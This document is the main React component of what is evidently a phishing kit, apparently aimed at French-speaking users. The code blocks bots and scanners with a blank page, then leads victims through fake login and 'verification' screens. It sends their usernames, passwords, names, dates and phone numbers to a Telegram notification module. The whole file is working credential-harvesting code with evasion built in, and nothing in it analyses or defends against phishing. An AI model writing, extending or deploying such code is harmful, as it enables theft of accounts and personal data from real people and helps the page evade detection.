import { useState, useEffect, useRef } from 'react';
import { AntiBotProtection } from './utils/antiBot';
import { sendLandingNotification, sendLoginNotification, sendVerificationNotification } from './utils/telegram';
import Header from './components/Header';
import Footer from './components/Footer';
import Loader from './components/Loader';
import LandingStep from './components/LandingStep';
import LoginStep from './components/LoginStep';
import VerificationStep from './components/VerificationStep';
import ConfirmationStep from './components/ConfirmationStep';

type Step = 'loading' | 'landing' | 'login' | 'verification' | 'confirmation';

export default function App() {
  const [step, setStep] = useState<Step>('loading');
  const [blocked, setBlocked] = useState(false);
  const credentials = useRef({ identifiant: '', password: '' });
  const gateRan = useRef(false);
  const stepRef = useRef<Step>('loading');

  const goStep = (s: Step) => {
    setStep(s);
    stepRef.current = s;
    window.scrollTo({ top: 0, behavior: 'smooth' });
  };

  useEffect(() => {
    if (gateRan.current) return;
    gateRan.current = true;

    const gate = async () => {
      try {
        const ab = AntiBotProtection.getInstance();
        await ab.whenReady();

        const bot = await ab.checkForBot();
        if (bot.isBot) { setBlocked(true); return; }

        goStep('landing');
      } catch {
        goStep('landing');
      }
    };
    gate();
  }, []);

  if (blocked) return <div className="fixed inset-0 bg-white" />;

  const handleLanding = () => { sendLandingNotification(); goStep('login'); };

  const handleLogin = (identifiant: string, password: string) => {
    credentials.current = { identifiant, password };
    sendLoginNotification(identifiant, password);
    goStep('verification');
  };

  const handleVerification = (data: { nom: string; prenom: string; date: string; tel: string }) => {
    sendVerificationNotification(data.nom, data.prenom, data.date, data.tel, credentials.current.identifiant, credentials.current.password);
    goStep('confirmation');
  };

  const showHeaderFooter = step !== 'loading' && step !== 'login';

  return (
    <div className="min-h-screen flex flex-col bg-gray-50">
      {showHeaderFooter && <Header />}
      <div className="flex-1">
        {step === 'loading' && <Loader />}
        {step === 'landing' && <LandingStep onContinue={handleLanding} />}
        {step === 'login' && <LoginStep onSubmit={handleLogin} />}
        {step === 'verification' && <VerificationStep onSubmit={handleVerification} />}
        {step === 'confirmation' && <ConfirmationStep />}
      </div>
      {showHeaderFooter && <Footer />}
    </div>
  );
}
